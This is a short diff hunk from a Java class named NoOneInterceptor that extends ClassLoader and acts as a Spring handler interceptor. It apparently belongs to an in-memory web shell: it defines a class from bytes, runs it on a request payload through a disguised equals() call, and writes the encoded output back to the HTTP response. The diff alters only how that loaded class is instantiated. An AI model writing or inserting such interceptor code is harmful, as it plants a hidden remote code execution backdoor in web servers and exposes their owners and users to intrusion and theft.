@@ -37,9 +37,8 @@ public class NoOneInterceptor extends ClassLoader implements AsyncHandlerInterce
                         coreClass = new NoOneInterceptor(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
                     }
                     ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+                    Object httpChannelCore = coreClass.newInstance();
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    httpChannelCore.toString();
                     ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
